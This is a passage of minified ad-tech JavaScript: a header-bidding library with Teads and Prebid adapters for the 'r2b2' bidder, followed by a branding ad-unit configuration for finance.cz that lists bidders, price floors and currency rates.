      for (var e = [this.chd.width + "x" + this.chd.height], i = this.chd.sizes ? this.chd.sizes : [], r = 0; r < i.length; r++) {
        var n = i[r].join("x");
        e.push(n);
      }
      var s = t.split("-");
      2 !== s.length && this.track.doError("Wrong format for key, should be: [pageId]-[placementId]");
      var a = s[0],
        o = s[1],
        d = "";
      try {
        d = AdTrack.Utils.getDomainName(window.top.location.hostname);
      } catch (t) {
        d = AdTrack.Utils.getDomainName(window.location.hostname);
      }
      var c = {
          referrer: d,
          data: [{
            sizes: e,
            bidId: Math.round(1e9 * Math.random()),
            bidderRequestId: Math.round(1e9 * Math.random()),
            placementId: Number(o),
            pageId: Number(a),
            adUnitCode: "AdTrackTeadsContainer",
            auctionId: AdTrack.Utils.uuid(),
            transactionId: AdTrack.Utils.uuid()
          }],
          pageReferrer: document.referrer,
          networkBandwidth: this.getConnectionDownLink(window.navigator),
          timeToFirstByte: this.getTimeToFirstByte(window),
          deviceWidth: screen.width,
          hb_version: "4.13.0"
        },
        h = this.track.getSupplyChain();
      h && (c.schain = h);
      var l = !1,
        u = !1,
        p = null;
      AdTrack.CMP && (p = AdTrack.CMP.getConsentData()), p && (l = !0, c.gdpr_iab = {
        consent: p.consentString || "",
        status: p.gdprApplies ? 12 : 0,
        apiVersion: p.version
      });
      var f = null;
      return AdTrack.USP && (f = AdTrack.USP.getConsentData()), f && f.consentString && (u = !0, c.us_privacy = f.consentString), (l || u) && this.track.evBidConsent(this.definition, this.chd, l, u), c;
    },
    getConnectionDownLink: function (t) {
      return t && t.connection && t.connection.downlink >= 0 ? t.connection.downlink.toString() : "";
    },
    getTimeToFirstByte: function (t) {
      const e = t.performance || t.webkitPerformance || t.msPerformance || t.mozPerformance,
        i = e && "function" == typeof e.getEntriesByType && "[object Function]" === Object.prototype.toString.call(e.getEntriesByType) && e.getEntriesByType("navigation")[0] && e.getEntriesByType("navigation")[0].responseStart && e.getEntriesByType("navigation")[0].requestStart && e.getEntriesByType("navigation")[0].responseStart > 0 && e.getEntriesByType("navigation")[0].requestStart > 0 && Math.round(e.getEntriesByType("navigation")[0].responseStart - e.getEntriesByType("navigation")[0].requestStart);
      if (i) return i.toString();
      const r = e && e.timing.responseStart && e.timing.requestStart && e.timing.responseStart > 0 && e.timing.requestStart > 0 && e.timing.responseStart - e.timing.requestStart;
      return r ? r.toString() : "";
    }
  }, AdTrack.TeadsCSync = AdTrack.TeadsCSync || (i = !1, function (t, e) {
    if (!i) {
      var r = null;
      AdTrack.CMP && (r = AdTrack.CMP.getConsentData());
      let t = {
        hb_provider: "prebid",
        hb_version: "3.4"
      };
      if (r) {
        var n = r.consentString || "";
        let e = {
          status: r.gdprApplies ? 12 : 0,
          consent: n
        };
        t.gdprIab = JSON.stringify(e);
      }
      e && (t.placementId = e);
      var s = Object.keys(t).map(function (e) {
        return [e, t[e]].map(encodeURIComponent).join("=");
      }).join("&");
      AdTrack.Utils.csyncFrame("https://sync.teads.tv/iframe?" + s), i = !0;
    }
  });
},,,,,,,,,,,,,,,,,,,,,,,,,,, function (t, i) {
  !function () {
    var t = AdTrack.Config.getPrebidObjectName();
    window[t] = window[t] || {};
    var i = window[t];
    i.que = i.que || [];
    var r,
      n,
      s,
      a,
      o,
      d,
      c,
      h,
      l,
      u,
      p,
      f,
      g,
      m,
      k,
      b,
      v = Math.floor(100 * Math.random()) <= 1,
      A = AdTrack.Utils.randomString("sessionId"),
      T = {},
      y = function () {
        var t,
          e,
          i = function (t) {
            return {
              iframe: t,
              req: {},
              rf: 0,
              rr: 0,
              rt: 0
            };
          };
        try {
          t = 0, window.top.AdTrack = window.top.AdTrack || {}, window.top.AdTrack.pbreq || (window.top.AdTrack.pbreq = i(t)), e = window.top.AdTrack.pbreq;
        } catch (r) {
          t = 1, AdTrack.pbreq || (AdTrack.pbreq = i(t)), e = AdTrack.pbreq;
        }
        return e;
      },
      w = function (t) {
        var e, i, r, n, s;
        e = 2023, i = 2, r = 16, n = 10, (s = Date.now()) >= new Date(Date.UTC(e, i, r, n, 0, 0)).getTime() && s <= new Date(Date.UTC(e, i, r, n, 15, 0)).getTime() && AdTrack.Prebid.error(t, null, "debug");
      },
      C = function (t) {
        var e = Date.now();
        e >= new Date(Date.UTC(2022, 6, 21, 10, 0, 0)).getTime() && e <= new Date(Date.UTC(2022, 6, 21, 10, 20, 0)).getTime() && v && AdTrack.Prebid.error("[" + A + "] " + t, null, "debug");
      };
    AdTrack.Prebid = AdTrack.Prebid || (r = AdTrack.XhrReport.getPrebidReport(AdTrack.Config.getReportingUrl(), AdTrack.Config.getHBDomain()), n = null, a = function (t, e, i, r) {
      "Prebid" === t && i === AdTrack.Log.ERROR && s(e, r);
    }, o = {}, d = {}, c = function (t) {
      var e;
      return t && d[t] && (e = d[t].shift()), e || AdTrack.Utils.time();
    }, m = function (t) {
      a("Prebid", "Ad render event failed - " + t.message, AdTrack.Log.ERROR), s("Prebid", "Ad render event failed - " + t.message, null);
    }, k = function (t) {
      if (t.bid && "r2b2" === (t.bid.bidder || t.bid.bidderCode)) {
        var e = AdTrack.Utils.getDGPMKey(t.bid);
        window.AdTrack.units[e].metrics.evProfiling("adRenderSucceeded", "cnc debug");
      }
      a("Prebid", "Ad render event succeeded", AdTrack.Log.INFO);
    }, {
      error: s = function (t, e, i) {
        n || (n = AdTrack.Utils.errorReporting(AdTrack.Config.getReportingUrl(), AdTrack.url, !0, AdTrack.Config.getHBDomain())), n.doError(t, e, i);
      },
      bidCall: function (t, e, i) {
        if (e) {
          var r = y(),
            n = r.req;
          n[e] || (n[e] = {
            count: 1,
            current: i
          }), n[e].current !== i && (n[e].count++, n[e].current = i);
          var s = n[e].count > 1 ? 1 : 0,
            d = s && r.rt ? c() - r.rt : 0;
          o[e] = {
            done: !1,
            timeouted: !1,
            adUnit: t
          }, AdTrack.call(e, "evPbjBidRequestDebug", t, c() - AdTrack.startTime, r.iframe, s, r.rf, r.rr, d);
        } else a("Prebid", "Cant log BR, key " + e + " is not registered", AdTrack.Log.ERROR);
      },
      noBid: function (t, e) {
        e && o[e] ? (o[e].done = !0, o[e].timeouted || AdTrack.call(e, "evPbjNoBid", t, c() - AdTrack.startTime)) : a("Prebid", "Cant log No Bid, key " + e + " is not registered", AdTrack.Log.ERROR);
      },
      bidDone: function (t, e, i) {
        e && o[e] ? (o[e].done = !0, AdTrack.call(e, "evPbjBidDone", t, i)) : a("Prebid", "Cant finish bid, " + e + " is not registered", AdTrack.Log.ERROR);
      },
      registerEvents: b = function () {
        i.que.push(function () {
          i.onEvent("bidRequested", p), i.onEvent("bidResponse", l), i.onEvent("auctionEnd", u), i.onEvent("bidWon", h), i.onEvent("auctionInit", f), i.onEvent("bidTimeout", g), i.onEvent("adRenderFailed", m), i.onEvent("adRenderSucceeded", k);
        });
      },
      evBidRequested: p = function (t) {
        try {
          var e = t.bidder || t.bidderCode,
            i = c("evBidRequested");
          t.bids.forEach(function (t) {
            var n = t.adUnitCode || t.placementCode;
            if ("r2b2" === e) {
              var s = AdTrack.Utils.getDGPMKey(t);
              AdTrack.call(s, "evPbjBidRequest", n, i - AdTrack.startTime);
            } else r.prebidBidRequest(n, e, i - AdTrack.startTime);
          });
        } catch (t) {
          a("Prebid", "Exception while handling bidRequested - " + t.message, AdTrack.Log.ERROR);
        }
      },
      evBidResponse: l = function (t) {
        try {
          var e = t.bidder || t.bidderCode,
            i = t.adUnitCode || t.placementCode,
            n = c("evBidResponse");
          if ("r2b2" === e) {
            if ("bidRejected" === t.status) return;
            var s = AdTrack.Utils.getDGPMKey(t),
              d = t.ext && t.ext.start;
            !function (t, e, i, r, n, s) {
              e && o[e] ? o[e].timeouted || AdTrack.call(e, "evPbjBid", t, s - AdTrack.startTime, i, r, AdTrack.Utils.time() - n) : a("Prebid", "Cant log Bid, " + e + " is not registered", AdTrack.Log.ERROR);
            }(i, s, t.cpm, t.currency, d, n);
          } else {
            var h = null;
            t.responseTimestamp && t.requestTimestamp && (h = t.responseTimestamp - t.requestTimestamp), r.prebidBid(i, e, n - AdTrack.startTime, t.cpm, t.currency, h);
          }
        } catch (t) {
          a("Prebid", "Exception while handling bidResponse - " + t.message, AdTrack.Log.ERROR);
        }
      },
      evAuctionEnd: u = function () {
        try {
          var t = c("evAuctionEnd");
          !function (t) {
            for (var e in o) o.hasOwnProperty(e) && (o[e].done || (o[e].timeouted = !0, AdTrack.call(e, "evPbjTimeout", o[e].adUnit, t - AdTrack.startTime)));
          }(t), i.getHighestCpmBids().forEach(function (e) {
            var i = e.bidder || e.bidderCode,
              n = e.adUnitCode || e.placementCode;
            if ("r2b2" === i) {
              var s = AdTrack.Utils.getDGPMKey(e);
              AdTrack.call(s, "evPbjWin", n, t - AdTrack.startTime, e.cpm, e.currency);
            } else r.prebidWin(n, i, t - AdTrack.startTime, e.cpm, e.currency);
          });
        } catch (t) {
          a("Prebid", "Exception while handling auctionEnd - " + t.message, AdTrack.Log.ERROR);
        }
      },
      evBidWon: h = function (t) {
        try {
          var e = t.bidder || t.bidderCode,
            i = t.adUnitCode || t.placementCode,
            n = c("evBidWon");
          if ("r2b2" === e) {
            var s = AdTrack.Utils.getDGPMKey(t);
            AdTrack.call(s, "evPbjLoad", i, n - AdTrack.startTime, t.cpm, t.currency);
          } else r.prebidLoad(i, e, n - AdTrack.startTime, t.cpm, t.currency);
        } catch (t) {
          a("Prebid", "Exception while handling bidWon - " + t.message, AdTrack.Log.ERROR);
        }
      },
      evAuctionInit: f = function (t) {
        try {
          var e = t.bidderRequests;
          e && e.length > 0 && e.forEach(function (t) {
            if (t) {
              var e = t.bidder || t.bidderCode;
              t.bids.forEach(function (t) {
                var n,
                  s = t.adUnitCode || t.placementCode;
                try {
                  if (Array.isArray(s)) a("Prebid", "adUnitCode or placementCode in adunit config is array, instead of string", AdTrack.Log.ERROR);else if ("r2b2" === e) {
                    var o = AdTrack.Utils.getDGPMKey(t);
                    o ? AdTrack.call(o, "evPbjInAuction", s) : C("Missing placementKey in auctionInit");
                  } else {
                    var d = (n = t.params) ? 0 === Object.keys(n).length ? 2 : n.length && n.length > 1 ? 3 : 0 : 1;
                    if (0 !== d && (C("Invalid params for " + e + " in auctionInit " + d + " Bid: " + JSON.stringify(t)), i && i.adUnits)) {
                      var c = 0,
                        h = "";
                      i.adUnits.forEach(function (t) {
                        t.code === s && (C("Adunit with code " + s + " " + JSON.stringify(t)), t.bids.forEach(function (t) {
                          t.bidder === e && (c++, h += JSON.stringify(t.params) + " ");
                        }), C(e + " adunit debug - bidder count: " + c + "; Params order: " + h));
                      });
                    }
                    r.prebidInAuction(s, e);
                  }
                } catch (t) {}
              });
            }
          });
        } catch (t) {
          a("Prebid", "Exception while handling auctionInit - " + t.message, AdTrack.Log.ERROR);
        }
      },
      evBidTimeout: g = function (t) {
        try {
          if (AdTrack.Prebid.timeouts) {
            var e = c("evBidTimeout");
            t.forEach(function (t) {
              var i = t.adUnitCode || t.placementCode,
                n = t.bidder || t.bidderCode;
              "r2b2" !== n && r.prebidBidTimeout(i, n, e - AdTrack.startTime);
            });
          }
        } catch (t) {
          a("Prebid", "Exception while handling bidTimeout - " + t.message, AdTrack.Log.ERROR);
        }
      },
      addTime: function (t, e) {
        d[t] || (d[t] = []), d[t].push(e);
      },
      refresh: function (t) {
        o = {}, d = {}, t && b();
      },
      getBids: function () {
        return o;
      },
      version: 2
    }), function (r) {
      r.AdTrack.PrebidAdapter && !r.AdTrack.PrebidAdapter.cmdQueue || (r.AdTrack.PrebidAdapter = function (n) {
        var s = n || {},
          a = {},
          o = {},
          d = {};
        s.execute = function (t, e) {
          h("Prebid", "Executed ad source, id: " + t, AdTrack.Log.INFO), "function" == typeof o[t] ? o[t](e) : h("Prebid", "Callback not found", AdTrack.Log.WARNING);
        }, s.getCallbacks = function () {
          return o;
        };
        var c = function (t) {
            return "function" == typeof t;
          },
          h = function (t, e, i, r) {
            "Prebid" === t && i === AdTrack.Log.ERROR && AdTrack.Prebid.error(e, r);
          },
          l = function (t) {
            return t.adUnitCode || t.placementCode;
          },
          u = function (t) {
            var i = "",
              n = null,
              s = function (t) {
                var e = null;
                try {
                  if ("string" != typeof t) return h("Prebid", "[" + i + "] Provided selector is not a string", AdTrack.Log.ERROR), null;
                  t = AdTrack.Utils.validateSelector(t), e = document.querySelector(t);
                } catch (e) {
                  h("Prebid", "[" + i + "] Exception while validating selector (" + t + ") - " + e.message, AdTrack.Log.ERROR);
                }
                return e ? t : null;
              };
            return {
              url: "//",
              render: function (a) {
                i = AdTrack.Utils.getDGPMKey(a);
                var o = function (e) {
                  try {
                    var n = l(e);
                    n || h("Prebid", "[" + i + "] Couldnt find a code of adunit", AdTrack.Log.ERROR);
                    var a = n ? "#" + n : null,
                      o = void 0;
                    o = e.ext.dgpm ? e.ext.dgpm.element : e.params[0] ? e.params[0].element : e.params.element;
                  } catch (t) {
                    h("Prebid", "[" + i + "] Exception getting element selector - " + t.message, AdTrack.Log.ERROR);
                  }
                  var d = null;
                  return !(d = void 0 !== o && s(o) || s(a)) && "prima" === r.AdTrack.units[t].settings.publisher.tag && r.AdTrack.units[t].definition.options.customPrimaSelectorPrebidTest && (d = s('div[data-d-area="' + n + '"], div[data-m-area="' + n + '"]')), !d && a && (d = s("#google_ads_iframe_" + n + "_0__container__")), d;
                }(a);
                r.AdTrack.units[t].metrics.evProfiling("prebid render - " + o, "cnc debug"), o || h("Prebid", "[" + i + "] Selector for ad not found (" + o + ")", AdTrack.Log.ERROR);
                try {
                  if (r.AdTrack.units[t].definitionWrapper.getOption("hidePrebidIframe")) if (n) {
                    var d = n.defaultView || n.parentWindow;
                    if (d !== r.top) d.frameElement.style.display = "none";else h("Prebid", "[" + i + "] Render ducument belongs to window top: " + e.message, AdTrack.Log.ERROR);
                  } else h("Prebid", "[" + i + "] Render ducument not passed: " + e.message, AdTrack.Log.ERROR);
                } catch (t) {
                  h("Prebid", "[" + i + "] Exception while hiding prebid iframe: " + t.message, AdTrack.Log.ERROR);
                }
                try {
                  r.AdTrack.units[t].displayAd(o, l(a) || "", a);
                } catch (t) {
                  h("Prebid", "[" + i + "] Exception while rendering ad: " + t.message, AdTrack.Log.ERROR);
                }
              },
              config: {
                documentResolver: function (t, e, i) {
                  return n = i, e;
                }
              }
            };
          };
        if (s.callBids = function (t, e, n, s, p, f) {
          AdTrack.Prebid.timeouts = "function" == typeof p;
          var g = AdTrack.Utils.time(),
            m = g;
          a.callBids && a.callBids > g && h("Prebid", "Time of callBids in adapter proxy is higher than now time", AdTrack.Log.ERROR, {
            proxyTime: a.callBids,
            now: g
          });
          try {
            !(c(e) && c(n)) && (e = c(i.addBidResponse) ? i.addBidResponse : function () {
              h("Prebid", "Unable to notify prebid - function not found", AdTrack.Log.ERROR);
            }, n = function () {});
            var k = t.auctionId,
              b = t.timeout,
              v = t.bids.length,
              A = 0,
              C = b - (a.callBids ? AdTrack.Utils.time() - a.callBids : 0);
            if (k && b || h("Prebid", "Auction parameters not available", AdTrack.Log.ERROR), d[k] ? (h("Prebid", "Duplicate auction id", AdTrack.Log.ERROR), d[k]++) : d[k] = 1, t.bids.forEach(function (s) {
              var a = AdTrack.ID.createIdFromBid(s),
                d = l(s);
              if (d || h("Prebid", "Unable to notify prebid - unit code not found", AdTrack.Log.ERROR), !a) {
                var c = 0;
                i && i.adUnits && i.adUnits.forEach(function (t) {
                  t.code === d && t.bids.forEach(function (t) {
                    "r2b2" === t.bidder && c++;
                  });
                }), c === s.params.length && (T[d] || (T[d] = 0), s.params[T[d]] && (a = AdTrack.ID.createIdFromBid({
                  params: s.params[T[d]]
                })), T[d]++);
              }
              if (a) {
                var f = a.getName();
                AdTrack.Prebid.bidCall(d, f, k), AdTrack.hb2.getHighestBidForAdUnit(a, function (a) {
                  try {
                    if (AdTrack.Prebid.bidDone(d, f, AdTrack.Utils.time() - m), "function" == typeof p && p("r2b2"), a && a.price) {
                      if (!a.adID) return void h("Prebid", "[" + f + "] Missing adID", AdTrack.Log.ERROR);
                      var c, l, g, k;
                      if (g = k = 0, a.options && a.response) {
                        if (a.options.sendDimension) {
                          var b = a.response.getDimension();
                          k = b.width, g = b.height;
                        }
                        a.options.video && (c = a.response.getVideoVastXML(), l = a.response.getVideoImpUrl());
                      }
                      var T = "r2b2-prebid-" + s.bidId;
                      o[T] = function (t) {
                        try {
                          if (t !== r) h("Prebid", "[" + f + "] Ad source executed in different window.", AdTrack.Log.ERROR);else {
                            var e = r.document,
                              i = e.querySelector("script#" + T),
                              n = e.createElement("div");
                            n.setAttribute("id", T + "-ad"), i.parentNode.insertBefore(n, i), AdTrack.call(f, "displayAd", "#" + T + "-ad", d, y);
                          }
                        } catch (t) {
                          h("Prebid", "[" + f + "] Ad source execution failed: " + t.message, AdTrack.Log.ERROR);
                        }
                      };
                      var y = {
                        bidder: "r2b2",
                        bidderCode: "r2b2",
                        adId: s.bidId,
                        requestId: s.bidId,
                        auctionId: t.auctionId,
                        transactionId: s.transactionId,
                        width: a.isBranding ? 2e3 : k,
                        height: a.isBranding ? 1400 : g,
                        mediaType: "banner",
                        ttl: 360,
                        currency: a.currency,
                        cpm: a.price,
                        creativeId: a.creativeId || "",
                        dealId: a.dealId,
                        renderer: u(a.adID),
                        source: "client",
                        params: s.params,
                        meta: {},
                        ext: {
                          dgpm: s.params,
                          start: m
                        },
                        ad: "<script id='" + T + "'>(function(){ try { var a = (window.AdTrack && window.AdTrack.PrebidAdapter) || (window.top.AdTrack && window.top.AdTrack.PrebidAdapter); a.execute('" + T + "', window); } catch (e) {console.error('R2B2 error.', e)} })();<\/script>"
                      };
                      c && l && (y.vastXml = c, y.vastImpUrl = l, y.mediaType = "video", y.renderer = null), i.que.push(function () {
                        try {
                          var t = function (t, e) {
                            try {
                              return Object.assign(t, e);
                            } catch (r) {
                              for (var i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
                              return t;
                            }
                          }(i.createBid(1), y);
                          e(d, t);
                        } catch (t) {
                          h("Prebid", "Exception while adding response to prebid - " + t.message, AdTrack.Log.ERROR);
                        }
                      });
                    } else AdTrack.Prebid.noBid(d, f);
                    ++A >= v && i.que.push(function () {
                      try {
                        n();
                      } catch (t) {
                        h("Prebid", "Exception while completing bids - " + t.message, AdTrack.Log.ERROR);
                      }
                    }), AdTrack.call(f, "evProfiling", "[r2b2Adapter] - end of callback");
                  } catch (t) {
                    h("Prebid", "Exception while handling HB response - " + t.message, AdTrack.Log.ERROR);
                  }
                }, C, k);
              } else h("Prebid", "Couldnt find dgpm params", AdTrack.Log.ERROR);
            }), 0 === v) try {
              n();
            } catch (t) {}
            var U = y();
            U.rt = g, U.rf = 0, U.rr = 0;
            var x = t.ortb2;
            x && w("ortb2:" + JSON.stringify(x));
          } catch (t) {
            h("Prebid", "Exception while calling bids - " + t.message, AdTrack.Log.ERROR);
          }
        }, s.getSpec = function () {
          return {
            supportedMediaTypes: ["banner", "video", "native"],
            onTimeout: function (t) {
              t && t.forEach(function (t) {
                if (t.params) {
                  var e = l(t);
                  t.params.forEach(function (t) {
                    var i = AdTrack.Utils.getDGPMKey({
                      params: t
                    });
                    AdTrack.call(i, "evPbjTimeoutDebug", e, AdTrack.Utils.time() - AdTrack.startTime);
                  });
                }
              });
            }
          };
        }, s.evBidRequested = function (t) {
          AdTrack.Prebid.evBidRequested(t);
        }, s.evBidResponse = function (t) {
          AdTrack.Prebid.evBidResponse(t);
        }, s.evAuctionEnd = function () {
          AdTrack.Prebid.evAuctionEnd();
        }, s.evBidWon = function (t) {
          AdTrack.Prebid.evBidWon(t);
        }, s.evAuctionInit = function (t) {
          AdTrack.Prebid.evAuctionInit(t);
        }, s.evBidTimeout = function (t) {
          AdTrack.Prebid.evBidTimeout(t);
        }, s.refresh = function (e, n) {
          var a = y();
          if (a.rf = 1, AdTrack.Config.isHBRefreshEnabled() && (e && (a.rr = 1, r[t] = r[t] || {}, (i = r[t]).que = i.que || [], i.que.push(function () {
            i.registerBidAdapter(function () {
              return s;
            }, "r2b2");
          })), AdTrack.Prebid.refresh(e), AdTrack.units)) for (var o in AdTrack.units) if (AdTrack.units.hasOwnProperty(o)) {
            var d = AdTrack.units[o];
            (d.getOption("refreshIM") || d.getOption("refreshPrebid")) && (d.renderer && d.renderer.destroy(), d.resetAd(), d.rendered = !1);
          }
        }, s.cmdQueue) {
          "function" != typeof s.event && AdTrack.Prebid.registerEvents();
          var p = s.cmdQueue;
          p.length > 0 && p.forEach(function (t) {
            "function" == typeof s[t.method] && (a[t.method] = t.time, AdTrack.Prebid.addTime(t.method, t.time), s[t.method].apply(s, t.args));
          }), s.cmdQueue = null;
        } else i.que.push(function () {
          i.registerBidAdapter(function () {
            return s;
          }, "r2b2");
        }), AdTrack.Prebid.registerEvents();
        return s;
      }(r.AdTrack.PrebidAdapter));
    }(window);
  }();
},,,,,,,,,,,,,,,,,,,,,,,,,,,,, function (t, e, i) {
  i(7), i(8), i(9), i(10), i(21), i(11), i(12), i(13), i(14), i(22), i(23), i(24), i(25), i(15), i(16), i(17), i(26), i(18), i(27), i(53), i(54), i(52), i(28), i(29), i(30), i(31), i(55), i(32), i(56), i(57), i(33), i(34), i(19), i(35), i(36), i(20), i(85), i(87), i(88), i(89), i(90), i(98), i(37), i(99), i(38), i(58), i(39), i(91), i(100), i(40), i(59), i(41), i(42), i(43), i(60), i(101), i(44), i(45), i(61), i(102), i(62), i(46), i(47), i(48), i(49), i(50), i(92), i(63), i(64), i(103), i(51), i(104), i(65), i(66), i(67), i(93), i(68), i(69), i(70), i(71), i(72), i(94), i(105), i(106), i(107), i(95), i(73), i(108), i(74), i(96), i(75), i(76), i(77), i(109), i(97), i(110), i(111), i(78), i(79), i(112), i(80), i(113), i(81), i(114), i(82), i(83), i(84), t.exports = i(141);
}]);
AdTrack.units["classic_ii.finance.cz_hb_branding"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "branding", {
  "renderer": "branding",
  "options": {
    "dom": {
      "method": "create",
      "container": "body"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "main": "div#bb_brandingWrap",
    "mainMarginTop": "230",
    "mainZIndex": "2",
    "mainForceWidth": "1050",
    "css": "#leaderboard {\ndisplay: none !important;\n}",
    "topFrame": "1",
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 17793,
    "tiers": [{
      "method": "hb",
      "id": 35927,
      "channels": [{
        "chd": {
          "id": 129069,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990741"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 2000,
          "height": 1400
        },
        "floor": 98.3,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 129071,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "990742"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 2000,
          "height": 1400
        },
        "floor": 100,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 129073,
          "tag": "pubmatic-hb",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "798915-3502080"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 2000,
          "height": 1400
        },
        "floor": 100,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 129077,
          "tag": "smart-hb",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-93600"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 2000,
          "height": 1400,
          "sizes": [[1800, 1000]]
        },
        "floor": 100,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 162685,
          "tag": "seznam-ssp-branding-hb2",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "228691"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 2000,
          "height": 1400
        },
        "floor": 100,
        "factor": 1,
        "factorFixed": 1,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
